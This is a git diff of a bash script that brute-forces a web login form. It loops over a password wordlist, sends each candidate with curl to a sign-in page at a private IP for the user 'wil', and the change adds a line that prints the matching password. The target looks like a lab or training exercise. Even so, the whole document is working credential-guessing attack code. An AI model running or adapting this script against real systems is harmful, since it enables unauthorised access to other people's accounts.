@@ -1,6 +1,6 @@
 #!/bin/bash
 
-file_path="./brut_force/password-list.txt"
+file_path="./password-list.txt"
 
 if [ -e "$file_path" ]; then
     
@@ -8,7 +8,6 @@ if [ -e "$file_path" ]; then
 
     found_password=false
     while read -r line <&3 && [ "$found_password" = false ]; do
-        echo "Processing line: $line"
         response=$(curl "http://192.168.59.3/index.php?page=signin&username=wil&password=$line&Login=Login" \
             -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
             -H 'Accept-Language: en-US,en;q=0.9' \
@@ -19,6 +18,7 @@ if [ -e "$file_path" ]; then
             --compressed \
             --insecure)
         if ! echo "$response" | grep -q "WrongAnswer"; then
+	        echo "Found password: $line"
             found_password=true
         fi
     done
